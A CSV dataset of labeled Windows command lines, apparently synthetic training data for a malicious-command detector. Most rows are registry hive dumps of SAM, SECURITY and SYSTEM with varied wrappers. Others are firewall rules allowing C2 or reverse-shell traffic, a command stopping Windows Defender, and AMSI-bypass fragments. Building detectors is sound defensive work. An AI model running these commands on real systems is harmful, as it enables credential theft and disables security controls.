text,label
reg save hklm\security c:\windows\temp\4gokj3in.save,1
reg   export   hklm\security   c:\windows\temp\99skzwgb.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\axjrojro.dat""",1
reg export hklm\security c:\windows\temp\85xkrmfs.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\dm7ga8yo.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\s9tnvbvp.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hgw96844.dat""",1
reg save hklm\security c:\windows\temp\rnrjnu2c.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\lp6fmdez.dat""",1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg export hklm\system c:\windows\temp\tcg4lt72.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\9foi0d74.save""",1
reg save hklm\security c:\windows\temp\hp3au2in.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\fzylooft.dat""",1
reg save hklm\sam c:\windows\temp\fs83z9rc.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\mu23w0cy.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bfnuz0gw.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\2u8tbb77.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\ebmv0rb7.save""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\his7dk8o.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\slc70b9k.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wwg2d75e.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\ecx1vqjr.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\q9kg9z3t.dat""",1
reg save hklm\security c:\windows\temp\h3qkgleh.save,1
reg save hklm\system c:\windows\temp\78qm7hmo.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\2mlvfmg4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\zp5mr268.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\j27j7vgf.dat""",1
reg   save   hklm\system   c:\windows\temp\gbzskjq5.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\13i8jrze.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\9d6ehakq.dat""",1
reg export hklm\sam c:\windows\temp\vdd9aqxf.save,1
reg save hklm\security c:\windows\temp\dtzf4kol.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\nf75u34q.dat""",1
reg save hklm\sam c:\windows\temp\rm2a9cnr.save,1
reg save hklm\security c:\windows\temp\w25lv6v7.save,1
reg save hklm\system c:\windows\temp\4odwzacu.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\5eql0qbq.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4z8hdfyn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\m1dyvv6b.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\zvm6iv36.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rxsxwbpc.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\iugbfle1.save""",1
reg save hklm\security c:\windows\temp\r5jts3f9.save,1
reg save hklm\security c:\windows\temp\hmvnyyqb.save,1
reg save hklm\system c:\windows\temp\hqgkd61s.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\k5id9a4f.dat""""",1
reg export hklm\system c:\windows\temp\fx5okm55.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\5su9wko8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\u70qdyib.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\v34qgq7c.dat""",1
reg   save   hklm\security   c:\windows\temp\xx6qjq8d.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\1dwdq4xp.dat""",1
reg save hklm\sam c:\windows\temp\37di5jsi.save,1
reg export hklm\security c:\windows\temp\dii7fywa.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\p9konle8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\vqgwvwti.dat""",1
reg export hklm\system c:\windows\temp\zsdrc39t.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\k1qrfxfw.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\milapp87.dat""""",1
reg save hklm\security c:\windows\temp\kjx3qo8y.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\z2h9ious.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\026854q4.dat""",1
reg export hklm\sam c:\windows\temp\ytgywisw.save,1
reg save hklm\system c:\windows\temp\vgln8ssp.save,1
reg export hklm\system c:\windows\temp\xse8r2ld.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\2p3otnux.dat""",1
reg  export  hklm\security  c:\windows\temp\4rgtohe3.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0mvvhiw3.dat""",1
reg export hklm\security c:\windows\temp\f3ovbf0y.save,1
reg save hklm\security c:\windows\temp\fi1m0pxi.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\8u7fsz1i.save""",1
reg export hklm\sam c:\windows\temp\vioro4ng.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1i38wvga.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\62nm91w2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\yh4k34lf.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\s7z5ihk9.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\o3q1qjp0.dat""",1
reg export hklm\sam c:\windows\temp\p9ajy6nj.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\2ooey9p3.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\55yeheva.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\08314y3z.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\7a7n8b6g.dat""""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\jb2qasmg.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4hwyq953.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\eqclyibx.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a4yapjdd.dat""",1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"powershell -nop -c ""reg export hklm\security c:\windows\temp\kfh52afz.save""",1
reg  export  hklm\sam  c:\windows\temp\5p0zo8wm.save,1
reg save hklm\sam c:\windows\temp\rtso8cut.save,1
reg export hklm\system c:\windows\temp\oetoy67q.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\qnmzid15.dat""",1
reg export hklm\security c:\windows\temp\lyvtsd9v.save,1
reg export hklm\system c:\windows\temp\ae5zrqic.save,1
reg export hklm\system c:\windows\temp\sz9ld8wa.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\hkctxata.save""",1
reg export hklm\security c:\windows\temp\zbte927t.save,1
reg save hklm\sam c:\windows\temp\gkg5lzvs.save,1
reg export hklm\security c:\windows\temp\s0y0blq2.save,1
reg export hklm\security c:\windows\temp\fu4nwpma.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\e2tskrsv.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2ych06y4.dat""",1
reg save hklm\security c:\windows\temp\81fse3ss.save,1
reg export hklm\sam c:\windows\temp\ny2f94mm.save,1
reg export hklm\security c:\windows\temp\48uv4zp7.save,1
reg export hklm\system c:\windows\temp\eqmp47lv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\hzuh6mvj.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\em58zkx3.dat""",1
reg export hklm\security c:\windows\temp\trv2nvq3.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\tt3b3f9t.dat""",1
reg export hklm\security c:\windows\temp\bm5edipn.save,1
reg export hklm\system c:\windows\temp\xnavpk27.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\z0u2a6bc.dat""",1
reg export hklm\sam c:\windows\temp\idftwz5x.save,1
reg save hklm\security c:\windows\temp\c31fhgdn.save,1
reg save hklm\security c:\windows\temp\a4i1w85x.save,1
reg save hklm\security c:\windows\temp\vgccqnkm.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\yy2qcc69.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rjpa7h1p.dat""",1
reg save hklm\sam c:\windows\temp\6ib65b4c.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ztwdk4m6.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ztjpzvnr.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\mntkuj5x.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   openprocesstoken(...)""",3
reg save hklm\sam c:\windows\temp\v008bs9u.save,1
reg save hklm\security c:\windows\temp\9vvuupjm.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\esw78t2x.dat""",1
reg save hklm\system c:\windows\temp\xdjjvy3h.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\ttl5rnju.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\g8uyeemz.dat""",1
reg export hklm\sam c:\windows\temp\1ladi3ds.save,1
reg save hklm\sam c:\windows\temp\jixofi27.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\esscvc6b.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\c175s5k9.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\4yr9mwrf.dat""",1
reg export hklm\security c:\windows\temp\zs3rh4zn.save,1
reg save hklm\sam c:\windows\temp\l38nj8ys.save,1
reg export hklm\system c:\windows\temp\phfewdsl.save,1
reg   save   hklm\system   c:\windows\temp\rwpsisiw.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\61322m9e.dat""",1
reg save hklm\system c:\windows\temp\qdc1m7n6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\85pbd86q.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\2jn70gp5.dat""""",1
reg save hklm\security c:\windows\temp\6i3ui9cu.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\4tz1hxj4.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\8oir97yd.dat""""",1
reg export hklm\system c:\windows\temp\0ggmlayk.save,1
reg export hklm\sam c:\windows\temp\n92bu8o8.save,1
reg export hklm\system c:\windows\temp\fabsp57d.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zl4bxcwn.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bfvegtm3.dat""",1
reg export hklm\system c:\windows\temp\lpng9ehx.save,1
reg   export   hklm\system   c:\windows\temp\8x2mei7l.save,1
reg export hklm\system c:\windows\temp\avjfe6qv.save,1
reg export hklm\system c:\windows\temp\9ww2dmh3.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\4zrnlu2y.save""",1
reg export hklm\security c:\windows\temp\n5zlydbu.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\85mwh9td.dat""",1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\cpwy36lv.save""",1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\xevzpikw.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1m7uv75g.dat""",1
reg save hklm\system c:\windows\temp\87hu11d6.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\9712nc91.dat""""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\rago6897.dat""""",1
reg save hklm\system c:\windows\temp\uhuctqnv.save,1
reg export hklm\sam c:\windows\temp\2mknstw9.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\0j2w9lo5.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\gsa1d93r.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7kl2c15r.dat""",1
reg save hklm\system c:\windows\temp\ijy0f3bx.save,1
reg export hklm\sam c:\windows\temp\khzcoc7n.save,1
reg save hklm\security c:\windows\temp\e7n2kuwa.save,1
reg export hklm\sam c:\windows\temp\wf2kv08d.save,1
reg save hklm\system c:\windows\temp\cswex0vn.save,1
reg save hklm\security c:\windows\temp\fil59lbn.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\zfgk540c.dat""",1
reg export hklm\sam c:\windows\temp\er2bpq3k.save,1
reg save hklm\system c:\windows\temp\8sf5f86u.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\h73aobsj.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\rdk42z5l.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\9guy88dn.dat""",1
reg export hklm\sam c:\windows\temp\5dy15ys5.save,1
reg export hklm\sam c:\windows\temp\gatfw71a.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\j4rwqynj.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\ney10ayd.save""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\1puet1bw.dat""",1
reg export hklm\system c:\windows\temp\24db80jw.save,1
reg  save  hklm\system  c:\windows\temp\1b9gckkd.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\j9dfb9v7.dat""",1
reg export hklm\security c:\windows\temp\qon17hc4.save,1
reg export hklm\system c:\windows\temp\9b428dl4.save,1
reg   export   hklm\sam   c:\windows\temp\4y0pybm4.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\uusavdgn.dat""",1
reg save hklm\system c:\windows\temp\3f5i3jbg.save,1
reg  save  hklm\system  c:\windows\temp\plaow3v2.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\tq6modqe.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\cnvvtyw1.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\finhxsva.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\xw2njmuh.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\n11mx6rr.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg export hklm\system c:\windows\temp\4vccl376.save""",1
reg  export  hklm\sam  c:\windows\temp\1a06ytzp.save,1
reg save hklm\system c:\windows\temp\7afz4x0m.save,1
reg export hklm\system c:\windows\temp\c6dw18bf.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\w6vl0ae7.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\2a1o9szl.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\f7wqnek7.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\jpws9d7h.dat""""",1
reg export hklm\security c:\windows\temp\1s993l6d.save,1
reg export hklm\security c:\windows\temp\fvc930z5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\048nowu8.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\zcv0opk6.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\75y8g3xh.dat""",1
reg save hklm\system c:\windows\temp\4q4op1xr.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\4n3m0odh.dat""",1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg save hklm\system c:\windows\temp\pwzywoil.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\2oeyvp0v.dat""",1
reg save hklm\sam c:\windows\temp\l4q0gk7c.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\nvsdd8yk.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\llsvsw4a.dat""",1
"cmd.exe /c ""sc stop windefend""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\empz5zpu.dat""",1
reg export hklm\system c:\windows\temp\q300judi.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\sg3szqvn.dat""",1
reg save hklm\system c:\windows\temp\2spenn1v.save,1
reg save hklm\sam c:\windows\temp\v4dff2ia.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\1sy3ntw6.dat""",1
reg export hklm\system c:\windows\temp\3jml2v4n.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\27akn8se.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\dhxnkw4d.dat""",1
reg save hklm\security c:\windows\temp\u04uitup.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\v7bricma.save""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\a0bfuu0r.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zmaycs26.dat""",1
reg export hklm\sam c:\windows\temp\vxp2ms21.save,1
reg export hklm\sam c:\windows\temp\ycpnppf8.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\dwtv8zbx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wd6hg0ar.dat""",1
reg export hklm\system c:\windows\temp\i2udzcbx.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\gy4isujx.dat""",1
reg export hklm\sam c:\windows\temp\c3e1q014.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\x6i5o7wb.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\i5lecuoe.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\1du9lfvv.dat""",1
reg export hklm\sam c:\windows\temp\1makwod0.save,1
reg save hklm\security c:\windows\temp\5ysakvh3.save,1
reg   export   hklm\sam   c:\windows\temp\r2ehpzti.save,1
reg export hklm\system c:\windows\temp\9vfiljlr.save,1
reg save hklm\security c:\windows\temp\a8pkaft7.save,1
reg export hklm\security c:\windows\temp\x399qc6v.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\sthsxw6c.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\lgql424x.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\e38k5n5c.dat""",1
reg save hklm\sam c:\windows\temp\d05n2zl6.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\9s2hh43e.dat""",1
reg export hklm\sam c:\windows\temp\txp6ho31.save,1
reg export hklm\security c:\windows\temp\ziuh28u2.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\9szw9skn.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rygzb6hv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\hc8q2gt2.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\uymtzw4h.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\5x55arbx.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\y9rqznhm.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\em85vmug.dat""",1
reg save hklm\sam c:\windows\temp\hji3n5ot.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\zdt34ugs.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\a5pws3g0.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\qou08wx7.dat""",1
reg save hklm\security c:\windows\temp\b934isvq.save,1
reg export hklm\sam c:\windows\temp\yrgj2irn.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ntezxwwf.dat""",1
reg save hklm\sam c:\windows\temp\z2wbvomk.save,1
reg save hklm\system c:\windows\temp\nqkw4wu5.save,1
reg export hklm\system c:\windows\temp\qy7ygiqu.save,1
reg export hklm\security c:\windows\temp\srsdsjqu.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\tryikv9g.dat""",1
reg save hklm\security c:\windows\temp\t0vtrf56.save,1
reg  export  hklm\sam  c:\windows\temp\k1di3luj.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\03gqb1u4.dat""",1
reg save hklm\system c:\windows\temp\gzrxiv36.save,1
reg  save  hklm\security  c:\windows\temp\sptzvhrz.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\to0iumaz.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\0zddw18f.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\ni40kf51.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mi0mgtnt.dat""",1
reg  export  hklm\security  c:\windows\temp\ngr97avk.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ippzo78k.dat""",1
reg export hklm\security c:\windows\temp\a4rrmk63.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\7wc1qv7g.dat""",1
reg export hklm\system c:\windows\temp\9iuy75zc.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\mjn9srnl.dat""",1
reg export hklm\sam c:\windows\temp\yl9949zy.save,1
reg save hklm\security c:\windows\temp\79olp2ou.save,1
reg save hklm\sam c:\windows\temp\xyq8xi3r.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\4s2d3o7z.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\qwa945zb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dt2pwm0b.dat""",1
reg save hklm\security c:\windows\temp\zfp3c3i2.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\bdkgsaba.dat""",1
reg save hklm\sam c:\windows\temp\uzj28p7r.save,1
reg export hklm\security c:\windows\temp\nw9uoyev.save,1
reg export hklm\sam c:\windows\temp\x5r2wer2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vmwd1c6i.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tqx5b1w5.dat""",1
reg export hklm\security c:\windows\temp\khkcprwj.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\87z98kra.dat""",1
reg save hklm\system c:\windows\temp\svs1085q.save,1
reg save hklm\system c:\windows\temp\i7c3493x.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7oupvpmk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\z8drd63b.dat""",1
